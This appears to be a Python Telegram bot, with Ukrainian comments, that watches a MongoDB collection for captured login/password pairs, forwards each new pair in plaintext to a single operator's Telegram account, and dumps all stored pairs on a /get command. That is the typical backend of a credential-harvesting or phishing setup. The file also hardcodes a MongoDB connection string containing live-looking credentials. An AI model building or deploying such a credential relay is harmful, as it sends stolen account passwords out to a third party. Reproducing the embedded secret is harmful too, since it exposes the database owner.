import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from motor.motor_asyncio import AsyncIOMotorClient
from bson.objectid import ObjectId

# Налаштування логування
logging.basicConfig(level=logging.INFO)

# Токен бота
API_TOKEN = ''

# Список дозволених користувачів
ALLOWED_USERS = {837420432}  # Заміни на реальні ID користувачів

# Підключення до MongoDB
MONGO_URI = "mongodb+srv://own:UR%40eL97PadVTTFjG@cluster0.uznqi.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Заміни на ваш URI
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client['quantik']  # Заміни на ваше ім'я бази даних
collection = db['quantik']  # Заміни на ваше ім'я колекції

# Ініціалізація бота
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Змінна для зберігання ID останнього обробленого документа
last_update_id = None

async def check_for_updates():
    global last_update_id
    while True:
        # Пошук нових документів
        query = {}
        if last_update_id:
            query['_id'] = {'$gt': ObjectId(last_update_id)}  # Отримати документи з ID більшими за останній оброблений
        cursor = collection.find(query).sort('_id', 1)  # Сортування за ID

        async for document in cursor:
            last_update_id = str(document['_id'])  # Оновлення ID останнього обробленого документа
            
            # Отримання логіна і пароля
            login = document.get('login', 'N/A')
            password = document.get('password', 'N/A')
            message = f"Оновлення в базі:\n\nLogin: {login}\nPassword: {password}"
            
            # Надсилання повідомлень дозволеним користувачам
            for user_id in ALLOWED_USERS:
                await bot.send_message(user_id, message)

        await asyncio.sleep(10)  # Затримка перед наступною перевіркою

# Обробник команди /start
@dp.message(Command("start"))
async def start_command(message: types.Message):
    if message.from_user.id in ALLOWED_USERS:
        await message.answer("Бот запущено! Ви будете отримувати сповіщення про оновлення.")
    else:
        await message.answer("Вибачте, ви не маєте доступу до цього бота.")

# Обробник команди /get
@dp.message(Command("get"))
async def get_command(message: types.Message):
    if message.from_user.id in ALLOWED_USERS:
        cursor = collection.find()
        response_message = "Записані дані:\n\n"
        
        async for document in cursor:
            login = document.get('login', 'N/A')
            password = document.get('password', 'N/A')
            
            response_message += f"Login: {login}\nPassword: {password}\n\n"

        await message.answer(response_message or "Дані не знайдено.")
    else:
        await message.answer("Вибачте, ви не маєте доступу до цієї команди.")

async def main():
    # Запуск перевірки оновлень
    asyncio.create_task(check_for_updates())
    # Запуск бота
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())